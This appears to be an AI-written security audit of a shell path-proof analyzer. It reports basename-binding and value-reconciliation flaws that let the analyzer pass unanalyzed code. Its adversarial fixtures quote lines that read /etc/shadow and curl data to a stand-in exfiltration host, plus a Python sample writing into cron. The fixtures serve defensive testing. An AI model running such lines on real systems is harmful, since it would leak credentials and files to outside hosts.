# SEC102 composite path proof — Claude flagship T1 audit, round 2

Date: 2026-08-11
Auditor: `claude-opus-5` xhigh (Max account), independent — Codex `gpt-5.6-sol` implemented
rounds 1 and 2. Fresh session.
Subject commit: `437593c5`. Working directory: `C:\LAB\Tradingview_LAB_CLEAN`.
Execution: **canonical** — the published matrix was re-run, and every finding below carries
executed output from this session.

## Verdict: `BLOCK`

Two independent constructions make the composite emit `PASS rc=0` for a program that, at
runtime, sources a file whose bytes were never read, never pinned and never analyzed. In
the primary construction that unanalyzed file contains `cat /etc/shadow` and a `curl` to an
external endpoint. A control proves the prover catches both sinks the moment it is given
the real bytes — the composite simply hands it different bytes. That is a silent composite
PASS over a real filesystem and network sink, which the kickoff defines as CRITICAL.

`BLOCK` rather than `REQUEST_CHANGES` because the root cause is architectural, not
mechanical: the plan schema has no field that records **where a member is deployed**
(`MEMBER_KEYS = {"id", "kind", "path"}`, and `path` is the in-bundle relative path). There
is therefore nothing for a rendered `source` operand to be compared against, and the code
falls back to matching on **basename**. Closing this requires a schema change plus a
re-derivation of the analysis-unit contract, not an edit to a comparison.

The engineering quality of the rest is high, and this should be said plainly: the seven-count
reconciliation, the terminal/process rc cross-check, the zero-fact PASS guard, the
fail-closed `invocable` gate and the residual discipline are all real and all verified
working below. The defect is not sloppiness — it is one unstated identity assumption
carrying the entire whole-program claim.

---

## 1. Identity of the bytes audited

| Artifact | Expected | Re-derived this session | Match |
|---|---|---|---|
| `composite_pathproof.py` | 84950 B / `d0737460…8d6a` | 84950 B / `d0737460240128ed395c474acf06793379eda50b8217ac81512ccc75bce48d6a` | yes |
| `pathscope_prover.py` | 122446 B / `890016f0…af1d` | 122446 B / `890016f0b9a8cde4eed33f8733f69055471b07c6096f6bc07450457e6c52af1d` | yes |

`git status --porcelain` shows **zero** tracked-file modifications at audit start and at
audit end. The prover has no worktree diff. Local interpreter: CPython 3.14.2 (the
implementer's `feature_version=(3,12)` AST assertion is a source-level gate, not the
runtime; noted, not a finding).

## 2. Contract item 1 — re-running the published matrix

The `SELF_QA_SEC102_R2.md` "Literal all-case assertion command" was executed **verbatim**
from the documented working directory.

```
26 cases, FAILED_COUNT=0
7 allocate  (6 RED + 1 GREEN)   all ASSERT=PASS
8 render    (7 RED + 1 GREEN)   all ASSERT=PASS
11 freeze   (9 RED + 2 GREEN)   all ASSERT=PASS
```

Every rc and every reason token matched the published expectation exactly. **26/26
reproduced.**

One reproduction note, not a finding: the harness as published uses repo-root-relative
paths and silently mis-asserts (rc 2, "can't open file") if the shell's working directory
is anything other than `C:\LAB\Tradingview_LAB_CLEAN`. My first run hit this. The self-QA
does state the working directory at the top; a `Set-Location` inside the fence would make
the block literally paste-and-run per Pattern 10.

D026 pre-feature check, also run verbatim: both new GREEN plans return `STOP rc=3` against
the exact round-1 code streamed from `73e92844`, and `rc=0` against current code.
**RED-before-GREEN confirmed** — see N2 for the discriminator's strength.

## 3. Findings

### F1 — CRITICAL — a `source` operand binds to a member by **basename**, so the analysis unit is built from bytes that are not the sourced file

`_member_for_operand` (`composite_pathproof.py:900`) resolves an operand to a member by
exact in-bundle path *or*, failing that, by basename:

```python
candidates = basename_to_ids.get(posixpath.basename(normalized), [])
if len(candidates) == 1:
    return candidates[0]
```

and `SubprocessPathProver._build_analysis_unit` (`:1380`) does not even keep the exact-path
key — its lookup table is basename-only:

```python
path_to_id = {
    posixpath.basename(logical_path): member_id
    for member_id, logical_path, _ in request.shell_members
}
```

This is not incidental. The shipped GREEN fixture depends on it: `entry.sh` contains
`source "$LIBRARY_PATH"` with `LIBRARY_PATH=/safe/fixture/library.sh`, an **absolute
deployed path**, which is bound to the in-bundle relative member `library.sh` purely
because the basenames agree. Basename matching is the bridge between "deployed path" and
"bundle path", and it is the only such bridge in the design.

Consequence: **any** operand ending in `/library.sh` binds to member `library`. The builder
then emits a synthetic `test -r <operand>` readability probe and splices in the **pinned
member's** bytes. The prover therefore analyzes the wrong program while the operand it does
see is only a readability probe — which passes as long as the directory is inside the
allowlist.

**Executed falsification.** A composite identical in shape to the shipped GREEN, with one
allocation changed to `LIBRARY_PATH=/safe/fixture/evil/library.sh`. The real
`evil/library.sh` (95 B, `f6cc4eda…`) is not a member, is not pinned, and is never read:

```bash
#!/usr/bin/env bash
cat /etc/shadow
curl -s "https://exfil.example.invalid/$ROOT" -o /tmp/loot
```

All three stages pass:

```
allocate  A1..A6 PASS   COMPOSITE_PATHPROOF verdict=PASS rc=0 reason=allocate_stage_closed
render    R1..R6 PASS   COMPOSITE_PATHPROOF verdict=PASS rc=0 reason=render_stage_closed
freeze    F1..F8 PASS   COMPOSITE_PATHPROOF verdict=PASS rc=0 reason=freeze_stage_closed
```

The freeze evidence rows assert closure over the wrong object:

```
DERIVED_EDGE  source="entry" target="library" kind="source"
              operand="/safe/fixture/evil/library.sh" disposition="DERIVED"
PROVER_MEMBER process_rc=0 resolved_fs_path_count=3 ... coverage_issue_count=0
              terminal="PASS:0:closed_and_allowlisted_lexical_argv_scope" disposition="PASS"
PROVER_RECORD record="PATH value=/safe/fixture/evil/library.sh verdict=ALLOW-LEXICAL
              rule=/safe/fixture/** sources=LIBRARY_PATH uses=line=5:test"
```

Note `uses=line=5:test` — the only thing the prover ever learned about
`/safe/fixture/evil/library.sh` is that something reads it. I dumped the analysis unit
handed to the prover by calling `_build_analysis_unit` directly (read-only import):

```
#!/usr/bin/env bash
ROOT='/safe/fixture'
RUNID='WPI-ADVERSARIAL'
# source identity=/safe/fixture/evil/library.sh
test -r "$LIBRARY_PATH"
# SEC102_BEGIN_SOURCE member=library
#!/usr/bin/env bash
cat "$ROOT/shared.txt"
# SEC102_END_SOURCE member=library
cat "$ROOT/$RUNID/input.txt"
```

The spliced child is the benign pinned member (43 B, `b96bb447…`), not the 95 B file the
program actually sources.

**Control — the sinks are catchable; the composite never saw them.** Same plan, same
allowlist, with the pinned member's bytes replaced by the bytes that are really sourced
(pins updated to match):

```
CLAIM id="F6" verdict="FAIL" reason="prover_member_rejected"
PROVER_MEMBER process_rc=1 resolved_fs_path_count=4 resolved_net_endpoint_count=1
              terminal="REJECT:1:path_outside_allowlist" disposition="FAIL"
PROVER_RECORD "PATH value=/etc/shadow verdict=FORBID rule=- sources=NONE uses=line=8:cat"
PROVER_RECORD "PATH value=/tmp/loot verdict=FORBID rule=- sources=NONE uses=line=9:curl"
PROVER_RECORD "ENDPOINT value=exfil.example.invalid:443 verdict=FORBID rule=- uses=line=9:curl"
COMPOSITE_PATHPROOF verdict=FAIL rc=1 reason=freeze_stage_deviant
```

`rc=1` versus `rc=0` on the same plan and the same allowlist, differing only in whether the
analyzed bytes were the real ones. The prover is doing its job; the composite is feeding it
a substitute.

**Patterns:** 8 (the name is not the identity — a basename is a label, not a file
identity), 11 (the declared instrument is not the executed instrument — the pinned member
is not the sourced object), 9 as overlay (`STATUS_SEC102.md` §5 and
`SEC102_R2_REPORT_2026-08-11.md` say "each **mechanically bound** / mechanically verified
standalone source edge"; the binding is basename equality and earns no such word).

**Not covered by a stated limitation.** Limitation 6/§5 discloses the `test -r` substitution
mechanism but asserts the edge is mechanically bound. Limitation 7/§6 disclaims full shell
dataflow, which is a different thing: this is not a dataflow gap, it is the operand→member
identity binding itself.

**Minimal fix.** Add a declared deployed path per member to the plan schema (e.g.
`deploy_path`, absolute, canonical). Require the operand — after allocation substitution —
to equal that declared `deploy_path` **exactly**. Delete the basename fallback in
`_member_for_operand` and key `_build_analysis_unit.path_to_id` on the same exact deployed
path. An operand that matches no declared `deploy_path` must STOP with a specific coverage
reason, never bind.

### F2 — CRITICAL — the plan's allocations and the prover's `constants.env` are two unreconciled sources for the same variable

The composite resolves `$LIBRARY_PATH` from **plan allocations** (`_literal_shell_word(raw,
unique_allocations)`) to decide which member an edge points at. It then emits `test -r
"$LIBRARY_PATH"` with the operand left **raw**, so the prover re-resolves the same variable
from **`constants.env`** — a separately pinned file. Nothing anywhere compares the two.

**Executed falsification.** Allocation `LIBRARY_PATH=/safe/fixture/library.sh` — innocent,
directory-correct, indistinguishable from the shipped GREEN under review. `constants.env`
declares `LIBRARY_PATH=/safe/fixture/somewhere/else/library.sh`.

```
DERIVED_EDGE   ... operand="/safe/fixture/library.sh" disposition="DERIVED"
PROVER_RECORD  "PATH value=/safe/fixture/somewhere/else/library.sh verdict=ALLOW-LEXICAL
                sources=LIBRARY_PATH uses=line=5:test"
COMPOSITE_PATHPROOF verdict=PASS rc=0 reason=freeze_stage_closed
```

Two rows in the same report name two different files for the same operand, and the tool
reconciles neither. This is a **separate root cause** from F1 and survives the F1 fix: even
with exact `deploy_path` matching, the composite would check the *allocation* value against
`deploy_path` while the prover expands the *constants* value.

It is also worse than F1 in reviewability. In F1 the divergent path is at least printed in
the `DERIVED_EDGE` operand. Here the reviewed artifact — the plan — is clean, and the
divergence lives in a pinned data file whose only property anyone checks is its SHA-256.

**Patterns:** 13 (the value universe is declared twice and never conserved across the
boundary), 11, 5/12 (a modeled contract with an unmodeled second binding source).

**Minimal fix.** Before invoking the prover, parse `constants.env` and require: every name
the plan allocates that also appears in constants is **byte-equal**; and every name the
analysis unit can expand is allocated by the plan. STOP on any divergence or any
prover-visible name the plan did not declare. Cleaner still: **generate** `constants.env`
from the allocations and pin the generated bytes, removing the second source entirely.

### F3 — MEDIUM — RENDER's R4 claims graph closure while silently skipping non-shell members

`_derive_graph` opens with `if member.kind != "shell": continue` (`:985`). A
`python_source` member contributes no derived edges and gets no coverage STOP, yet R4
reports `derived_source_graph PASS "rendered_bytes_derive_the_declared_reachable_graph"`.

**Executed falsification.** A render plan with `entry` (shell) and `verifier`
(`python_source`) whose body is:

```python
import subprocess
subprocess.run(['curl','-s','https://exfil.example.invalid','-o','/etc/cron.d/x'])
open('/etc/shadow').read()
```

```
R1..R6 all PASS
RENDER_MEMBER id="verifier" kind="python_source" graph="REACHABLE"
              materialisation="PASS" disposition="ACCEPT"
COMPOSITE_PATHPROOF verdict=PASS rc=0 reason=render_stage_closed
```

The member is marked `REACHABLE` and `ACCEPT` although nothing modeled its outbound edges
or its content. **This is contained at the composite level** — FREEZE correctly STOPs with
`non_shell_member_analyzer_not_integrated`, which the published `red_freeze_member_disposition`
fixture drives, so no full composite PASS follows. It is graded MEDIUM for that reason. But
a RENDER stage verdict is an artifact an operator can read on its own, and R4's sentence is
false for that plan.

**Pattern:** 12 (what the analyzer does not model must not disappear), 9 overlay. The
asymmetry is telling — FREEZE gets this exactly right and RENDER does not.

**Minimal fix.** In `_derive_graph`, replace the `continue` with a recorded
`Verdict.STOP` coverage reason (e.g. `member_kind_graph_derivation_not_modeled`) and set
`derivation_blocked = True`, mirroring what FREEZE already does at `:1772`.

### N1 — NIT — 17 of the adapter's 18 defensive STOP branches are driven by no published fixture

Contract item 3 asked for a fixture per adapter branch. Census of `_stop_result` reasons
against `SELF_QA_SEC102_R2.md`:

| Driven | Undriven |
|---|---|
| `prover_output_grammar_incomplete` | `prover_stderr_nonempty`, `prover_output_unknown_record`, `prover_resolved_count_mismatch`, `prover_unresolved_kind_ambiguous`, `prover_unresolved_kind_missing`, `prover_issue_count_mismatch`, `prover_path_disposition_ambiguous`, `prover_path_disposition_missing`, `prover_endpoint_disposition_ambiguous`, `prover_endpoint_disposition_missing`, `prover_process_terminal_rc_mismatch`, `prover_issue_terminal_mismatch`, `prover_issue_reason_mismatch`, `prover_forbid_terminal_mismatch`, `prover_forbid_reason_mismatch`, `prover_pass_terminal_mismatch`, `prover_pass_reason_mismatch` |

Most are reachable only if the pinned prover contradicts itself, so leaving them undriven is
defensible — but Pattern 10 / `[AUDIT1 N1]` requires the counts be *stated*: arms driven
versus arms carried undriven. Neither `SELF_QA_SEC102_R2.md` nor `STATUS_SEC102.md` says so,
and §7 of STATUS reads as though the whole reconciliation is exercised. Either unit-test
`_invoke_member`'s parser against synthetic stdout strings (cheap, no prover change needed),
or state the exact undriven count.

I verified two of these branches independently and both behave correctly: the zero-fact
guard (`prover_zero_facts_pass`) returns `STOP rc=3` on a member with no path operands, and
a widened allowlist is rejected upstream (see §5).

### N2 — NIT — the D026 pre-feature RED is schema-level, not behaviour-level

Both new GREEN plans go RED against `73e92844` with
`plan_schema_unknown_key detail="plan.composites[0]:proof"`. Round-1 code cannot *parse* a
round-2 plan, so the RED shows the feature is new, not that the new logic discriminates.
Mitigated — and I want to credit this — by the two in-memory mutation tests, which are
genuine discriminators and which I read as sound: disabling `if expected != rendered_data:`
turns the materialisation RED into `PASS rc=0`, and disabling the issue/terminal branches
turns a prover rc-3 coverage record into `PASS rc=0`. Those are the real D026 evidence; the
`73e92844` run should be labelled as pre-feature schema rejection rather than presented
alongside them as equivalent.

## 4. Contract items 4 and 5

**Item 4 — pattern 1 ("inability to evaluate STOPs, never PASS/FAIL") and pattern 13
("every input member gets a disposition").** Both hold, and hold well, at every new stage,
with one exception each — and the exceptions are the findings above, not the rule.

Pattern 1 is respected throughout: `InputStop` → `stop_all`; unmodeled grammar → STOP with a
specific reason; `Verdict` precedence `STOP > FAIL > PASS` is enforced structurally by
`VERDICT_PRIORITY` rather than by convention; the `invocable` gate degrades to
`prover_prerequisite_not_closed` STOP rather than skipping the proof; `total_issues` maps to
STOP while `has_forbid` maps to FAIL, which is the correct split between "could not resolve"
and "resolved and deviant". I specifically checked the `has_forbid` substring test
(`" verdict=FORBID "`, trailing space required) for a false-negative — if it ever missed, the
independent terminal-verdict cross-check catches it as `prover_pass_terminal_mismatch` STOP.
Genuine defence in depth.

Pattern 13 is respected in the accounting sense — `RENDER_CONSERVATION`,
`FREEZE_CONSERVATION` and `GRAPH_CONSERVATION` rows reconcile input counts to terminal-row
counts, every member gets exactly one `disposition`, and non-shell members STOP at FREEZE.
It fails in the *identity* sense, which F1 and F2 are: a member can hold a terminal
disposition that is about a different file than the one the program uses. Conservation of
count without conservation of identity is precisely the Pattern 13 failure mode
(`[AUDIT2 A2-F3]`, `[RP6_CLAUDE_REAUDIT_R5 F2]`), and F3 is the count-level instance at
RENDER.

**Item 5 — are the residual R1 and the documented limitations honestly stated?** Mostly yes,
and on the specific question asked, yes.

- **R1 symlink/mount:** honestly carried. Both residuals emit with `control=false`,
  `red_freeze_residual.json` drives their absence to STOP, and neither the report nor STATUS
  upgrades `ALLOW-LEXICAL` to host-object proof. This is the correct handling of Pattern 3
  and it is done properly.
- **Python/execute-source, launch/bootstrap, runtime-family limits (STATUS 2, 3, 9, 11):**
  honestly stated as explicitly-scoped weaker claims, and each is *enforced* by a STOP rather
  than merely disclosed — `non_shell_member_analyzer_not_integrated` and
  `analysis_unit_non_source_edge_not_integrated` are real gates. This meets the kickoff's
  "an explicitly-scoped weaker claim is acceptable for this stage" bar.
- **`sys.executable` (STATUS 7) and the temp directory (STATUS 8):** correctly disclosed. The
  interpreter is a genuine Pattern 4 surface but is named as such and is out of scope for a
  local fixture stage.
- **Where honesty fails:** STATUS §5 and report line 41 call each source edge "mechanically
  bound" / "mechanically verified". F1 shows the binding is basename equality. That single
  word carries the whole-program claim and has not been earned — Pattern 9 in its primary
  form. No limitation anywhere discloses that a member's identity is matched by basename, or
  that `constants.env` is a second unreconciled value source (F2).

## 5. What I attacked that held

Reported so the negative results are on record and not re-attempted:

- **Widening the plan-declared allowlist to `/**`** to force a PASS over `/etc/shadow`: the
  prover rejects that allowlist grammar and the composite correctly returns
  `STOP rc=3 prover_output_grammar_incomplete`. Not a finding.
- **Zero-fact PASS:** a member with no path operands yields
  `resolved_fs_path_count=0`, prover `PASS`, and the composite still returns `STOP rc=3` via
  the `prover_zero_facts_pass` guard. Pattern 12's "zero facts plus PASS is always red" is
  correctly implemented.
- **Here-document false edge, dynamic operands, non-standalone source sites:** all STOP.
  `analysis_unit_source_site_not_standalone` closes the obvious variant of F1 in which the
  source line is disguised.
- **Prover output-grammar tampering:** `known_lines` completeness, the seven-count
  reconciliation, per-record disposition validation and the process/terminal rc equality
  check are all real and all fire.
- **Dropping a prover coverage/residual signal:** I could not find a path where a prover
  STOP, REJECT, coverage record, forbidden operand or residual reaches a composite PASS.
  Contract item 3's mapping question is **answered yes** — the adapter mapping is faithful
  *for the output it receives*. F1 and F2 do not break the mapping; they change the input the
  prover is given.

## 6. Thirteen-pattern assessment

| # | Pattern | Verdict |
|---|---|---|
| 1 | STOP is not a result | **Clean** — precedence enforced structurally |
| 2 | Whose kernel answered? | **Clean for scope** — lexical-only, `host_probe=none` asserted |
| 3 | The leaf is not the path | **Clean** — symlink/mount carried as R1 disclosures, `control=false` |
| 4 | Privileged child's environment | **Disclosed** — `sys.executable` unpinned (STATUS 7); acceptable at T1 fixture scope |
| 5 | grep is not a parser | **Clean** — anchored regexes, duplicate-key rejection, `known_lines` completeness |
| 6/7 | Read the status before the stdout | **Clean** — rc, stderr and grammar completeness all adjudicated before records are read |
| 8 | **The name is not the identity** | **F1** — basename stands in for file identity |
| 9 | The sentence outruns the probe | **F1, F3 overlay** — "mechanically bound" not earned |
| 10 | Evidence that cannot fail | **N1, N2** — 17 undriven arms uncounted; D026 RED is schema-level |
| 11 | **Declared instrument ≠ executed instrument** | **F1, F2** — pinned member is not the sourced object |
| 12 | Unmodeled must not disappear | **F3** — non-shell members skipped at RENDER; clean elsewhere |
| 13 | Every member needs a terminal disposition | **F2, F3** — counts conserved, identity not |

## 7. Required before re-audit

1. **F1** — schema field for the deployed path; exact operand↔member matching; basename
   fallback deleted; unmatched operand STOPs.
2. **F2** — reconcile allocations against `constants.env`, or generate the latter from the
   former.
3. **F3** — non-shell members STOP graph derivation at RENDER as they already do at FREEZE.
4. **N1, N2** — state driven vs. undriven arm counts; relabel the `73e92844` run as
   pre-feature schema rejection.
5. New RED fixtures for F1 and F2 specifically — a directory-divergent operand, and an
   allocation/constants divergence — both currently `PASS rc=0`.

This is round 2 of a T1 with a two-round maximum. F1 requires a schema change, so the Lead
should treat the F1/F2 repair as an architectural round requiring explicit authority rather
than a bounded mechanical fix under the standing autonomy.

## 8. Read-only attestation

No repository file was edited, created or deleted except this report. No `git checkout`,
`reset`, `stash`, `add`, `commit` or `push` was run; the only Git commands used were
`status`, `log` and `git show 73e92844:…` piped to stdin. No host was contacted and no
network request was made — `exfil.example.invalid` appears only as static text inside
fixture bytes that were parsed as data, never executed.

All adversarial fixtures were built **outside the repository**, under the session scratchpad
`…\Temp\claude\C--LAB-Tradingview-LAB-CLEAN\<session>\scratchpad\` (`adv_A`, `control_A`,
`adv_B`, `probe_zero`, `probe_parse`, `probe_render_nonshell`, `probe_allowlist`). Member
paths resolve from the plan's own directory, so no fixture needed to live in the repo; the
pinned prover was read from the repo unmodified. No tracked file was touched by any
concurrent lane's work either.

```
git status --porcelain | grep -v '^??'   ->  (empty, at start and at end)
```

The 45 untracked entries are the concurrent lanes' pre-existing logs and drafts plus this
report.
